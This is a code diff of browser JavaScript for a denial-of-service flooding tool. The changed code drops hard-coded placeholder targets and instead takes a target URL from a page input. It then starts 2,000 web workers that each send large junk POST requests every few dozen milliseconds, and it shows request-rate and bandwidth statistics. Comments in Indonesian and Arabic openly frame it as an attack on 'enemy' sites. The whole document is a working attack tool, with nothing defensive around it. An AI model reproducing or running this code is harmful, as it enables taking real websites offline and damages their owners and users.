@@ -1,64 +1,68 @@
-// 🔥 DDoS Targets (Ganti dengan target musuh!)
-const TARGETS = [
-    "https://TARGET-1.com",
-    "https://TARGET-2.net",
-    "https://TARGET-3.org"
-];
+const MAX_WORKERS = 2000;  // Jumlah maksimal workers
+let workers = [];
+let attackActive = false;
+let totalRequests = 0;
+let startTime = 0;
 
-let attackWorkers = [];
-let isDestroying = false;
-
-function createWarrior(target) {
-    return new Worker(URL.createObjectURL(new Blob([`
-        let attackCount = 0;
-        const BOMB_PAYLOAD = new Array(100000).fill(0);
-        
-        function fireMissile() {
-            fetch("${target}", {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ data: BOMB_PAYLOAD })
-            })
-            .then(() => {
-                attackCount++;
-                postMessage(\`☠️ هجمة #\${attackCount} → \${target}\`);
-            })
-            .catch(() => postMessage('🔥 الخادم يحترق!'));
-        }
-
-        setInterval(fireMissile, 25);
-    `])));
-}
-
-document.getElementById('attack-btn').addEventListener('click', function() {
-    isDestroying = !isDestroying;
+// Hitung statistik setiap detik
+setInterval(() => {
+    if(!attackActive) return;
     
-    if(isDestroying) {
-        this.textContent = "☠️ تدمير نشط";
-        this.style.background = "#000";
-        this.style.color = "#ff0000";
+    const elapsed = (Date.now() - startTime) / 1000;
+    const rps = Math.round(totalRequests / elapsed);
+    const bandwidth = (rps * 0.1).toFixed(1); // Estimasi 0.1MB/request
+    
+    document.getElementById('rps').textContent = rps;
+    document.getElementById('bandwidth').textContent = bandwidth + ' MB/s';
+    document.getElementById('workerCount').textContent = workers.length;
+}, 1000);
 
-        // Aktifkan 666 zombie workers
-        for(let i = 0; i < 666; i++) {
-            const target = TARGETS[i % TARGETS.length];
-            const worker = createWarrior(target);
+document.getElementById('attackBtn').addEventListener('click', async () => {
+    const TARGET = document.getElementById('targetUrl').value;
+    if(!TARGET) return alert("Masukkan URL target!");
+    
+    attackActive = !attackActive;
+    const btn = document.getElementById('attackBtn');
+    
+    if(attackActive) {
+        btn.textContent = "☠️ STOP ATTACK";
+        btn.style.background = "#000";
+        btn.style.color = "#ff0000";
+        startTime = Date.now();
+        totalRequests = 0;
+        
+        // Mulai 2000 workers
+        for(let i = 0; i < MAX_WORKERS; i++) {
+            const worker = new Worker(URL.createObjectURL(new Blob([`
+                let reqCount = 0;
+                const PAYLOAD = new Array(50000).fill(0);
+                
+                async function attack() {
+                    try {
+                        await fetch('${TARGET}', {
+                            method: 'POST',
+                            mode: 'no-cors',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify(PAYLOAD)
+                        });
+                        reqCount++;
+                        postMessage(reqCount);
+                    } catch(e) {}
+                }
+                
+                setInterval(attack, ${Math.floor(Math.random() * 50) + 25});
+            `])));
             
-            worker.onmessage = function(e) {
-                document.getElementById('status').innerHTML = 
-                    `[الهجمة \${i}] \${e.data}<br>` + 
-                    document.getElementById('status').innerHTML;
-            };
-            
-            attackWorkers.push(worker);
+            worker.onmessage = (e) => totalRequests++;
+            workers.push(worker);
         }
+        
     } else {
-        // Matikan semua workers
-        attackWorkers.forEach(w => w.terminate());
-        attackWorkers = [];
-        this.textContent = "🔥 بدء الهجوم";
-        this.style.background = "#ff0000";
-        this.style.color = "#000";
-        document.getElementById('status').innerHTML = "الحالة: توقف القصف";
+        // Hentikan semua workers
+        workers.forEach(w => w.terminate());
+        workers = [];
+        btn.textContent = "🚀 LAUNCH ATTACK";
+        btn.style.background = "#ff0000";
+        btn.style.color = "#000";
     }
 });
